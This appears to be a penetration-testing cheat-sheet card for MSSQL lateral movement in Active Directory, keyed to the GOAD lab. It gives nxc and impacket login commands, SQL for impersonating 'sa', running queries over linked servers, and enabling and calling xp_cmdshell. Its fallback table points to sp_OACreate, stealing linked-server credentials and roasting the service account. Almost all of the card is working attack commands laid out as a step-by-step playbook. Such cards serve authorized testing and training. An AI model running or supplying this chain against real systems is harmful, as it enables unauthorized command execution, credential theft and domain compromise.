# MSSQL (senior)

A login is not a hop. Impersonate → links → `xp_cmdshell`. GOAD NORTH→ESSOS
is this card.

## When / not

Use when recon saw 1433, or BH / nxc showed a SQL SPN.
Skip if `nxc mssql {{CIDR}}` is empty.

## Flags

```
nxc mssql {{CIDR}} -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}}
nxc mssql HOST -u {{USER}} -p '{{PASS}}' -d {{DOMAIN}} \
  -q "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"

python3 /opt/adtk/mssql-hop.py --i-am-authorized \
  --host HOST --domain {{DOMAIN}} --user {{USER}} --password '{{PASS}}'

impacket-mssqlclient {{DOMAIN}}/{{USER}}:'{{PASS}}'@HOST
# Kerberos:
impacket-mssqlclient -k -no-pass {{DOMAIN}}/{{USER}}@HOST.FQDN
```

## Inside the client (order)

```sql
SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT name FROM sys.server_principals;
-- impersonate
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
EXECUTE AS USER  = 'dbo';
REVERT;
-- links
SELECT name, data_source FROM sys.servers;
EXEC ('SELECT @@SERVERNAME, SYSTEM_USER') AT [BRAAVOS];
-- once sa / sysadmin
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

Linked login is often a **different domain**. That is the forest hop.

## Read this

- `IS_SRVROLEMEMBER('sysadmin') = 1` → skip impersonate, go links / xp_cmdshell.
- `IMPERSONATE` on `sa` / `dbo` is the usual first priv.
- Link name (`BRAAVOS`) ≠ hostname. Use the `sys.servers.name`.
- `xp_cmdshell` runs as the service account (`sql_svc$` / a domain user). Roast
  that user if you only get a hash later.

## Fail → next

| Symptom | Next |
| --- | --- |
| login failed | try hash / Kerberos / local SQL auth (`-d ''`) |
| no impersonate, not sa | `CREATE ASSEMBLY` is rare in labs — leave |
| link exists, EXEC AT denied | impersonate first, then hop |
| xp_cmdshell blocked by policy | OLE `sp_OACreate` or just steal the link cred via `sys.linked_logins` |
| shell is `NETWORK SERVICE` | local PrivEsc or back to LDAP as the SQL domain account |

## Chain

jon.snow on CASTELBLACK → impersonate / link BRAAVOS → essos.local user →
BloodHound `-d essos.local` → ADCS / LAPS. Do not DCSync NORTH and call it done.
